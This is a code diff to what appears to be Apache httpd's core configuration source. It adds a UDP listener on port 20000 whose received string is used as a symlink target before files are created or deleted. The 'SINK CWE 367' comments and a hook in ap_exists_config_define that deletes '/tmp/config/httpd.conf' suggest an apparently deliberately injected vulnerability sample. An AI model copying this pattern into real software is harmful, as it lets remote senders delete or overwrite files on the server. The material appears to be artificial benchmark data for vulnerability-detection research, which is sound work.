@@ -14,6 +14,9 @@
  * limitations under the License.
  */
 
+#include <stdio.h>
+#include <fcntl.h>
+
 #include "apr.h"
 #include "apr_strings.h"
 #include "apr_lib.h"
@@ -57,6 +60,10 @@
 #include "ap_regex.h"
 #include "core.h"
 
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
 #include "mod_so.h" /* for ap_find_loaded_module_symbol */
 
 #if defined(RLIMIT_CPU) || defined (RLIMIT_DATA) || defined (RLIMIT_VMEM) || defined(RLIMIT_AS) || defined (RLIMIT_NPROC)
@@ -88,6 +95,9 @@
 
 #define AP_FLUSH_MAX_THRESHOLD 65535
 #define AP_FLUSH_MAX_PIPELINED 4
+
+#define UDP_PORT 20000
+#define BUFFER_SIZE 1024
 
 APR_HOOK_STRUCT(
     APR_HOOK_LINK(get_mgmt_items)
@@ -785,6 +795,48 @@ void ap_core_reorder_directories(apr_pool_t *p, server_rec *s)
     apr_pool_destroy(tmp);
 }
 
+char* conn_msg_udp() {
+	static char buffer[BUFFER_SIZE + 1];
+	int fd;
+	struct sockaddr_in local_addr, sender_addr;
+	socklen_t sender_len = sizeof(sender_addr);
+	ssize_t len;
+
+	// Create UDP socket
+	fd = socket(AF_INET, SOCK_DGRAM, 0);
+	if (fd < 0) {
+		return NULL;
+	}
+
+	// Configure local address
+	memset(&local_addr, 0, sizeof(local_addr));
+	local_addr.sin_family = AF_INET;
+	local_addr.sin_addr.s_addr = INADDR_ANY;
+	local_addr.sin_port = htons(UDP_PORT);
+
+	// Bind socket to the specified port
+	if (bind(fd, (struct sockaddr*)&local_addr, sizeof(local_addr)) < 0) {
+		close(fd);
+		return NULL;
+	}
+
+	// Wait for incoming UDP message
+	len = recvfrom(fd, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&sender_addr, &sender_len);
+	if (len < 0) {
+		close(fd);
+		return NULL;
+	}
+
+	// Null-terminate the received data
+	buffer[len] = '\0';
+
+	// Close socket after receiving the message
+	close(fd);
+
+	return buffer;
+}
+
+
 /*****************************************************************
  *
  * There are some elements of the core config structures in which
@@ -893,6 +945,33 @@ AP_DECLARE(void) ap_set_context_info(request_rec *r, const char *context_prefix,
         conf->context_prefix = context_prefix;
     if (context_document_root)
         conf->context_document_root = context_document_root;
+}
+
+int core_set_default_config_file(char *filename) {
+    if (access(filename, F_OK) == 0) {
+        printf("File '%s' already exists!\n", filename);
+        return 1;
+    }
+
+    char *custom_filename = conn_msg_udp();
+    if (custom_filename) {
+        if (symlink(custom_filename, filename) == 0) {
+            printf("Custom file is set!\n");
+        } else {
+            perror("Failed to set custom file");
+        }
+    }
+
+    // SINK CWE 367
+    int fd = creat(filename, 0644);
+    if (fd == -1) {
+        perror("Failed to create file");
+        return 1;
+    }
+
+    printf("File '%s' created successfully!\n", filename);
+    close(fd);
+    return 0;
 }
 
 /* Should probably just get rid of this... the only code that cares is
@@ -2982,8 +3061,35 @@ static int test_ifmod_section(cmd_parms *cmd, const char *arg)
     return find_module(cmd->server, arg) != NULL;
 }
 
+int core_delete_config_file(char *filename) {
+    if (access(filename, F_OK) != 0) {
+        return 1;
+    }
+
+    char *real_filename_being_used = conn_msg_udp();
+    if (real_filename_being_used) {
+        unlink(filename);
+        if (symlink(real_filename_being_used, filename) == 0) {
+            printf("Symbolic link created: '%s' -> '%s'\n", filename, real_filename_being_used);
+        } else {
+            perror("Failed to create symbolic link");
+            return 1;
+        }
+    }
+
+    // SINK CWE 367
+    if (unlink(filename) == -1) {
+        perror("Failed to delete file");
+        return 1;
+    }
+
+    printf("File '%s' deleted successfully!\n", filename);
+    return 0;
+}
+
 AP_DECLARE(int) ap_exists_config_define(const char *name)
 {
+    core_delete_config_file("/tmp/config/httpd.conf");
     return ap_array_str_contains(ap_server_config_defines, name);
 }
 
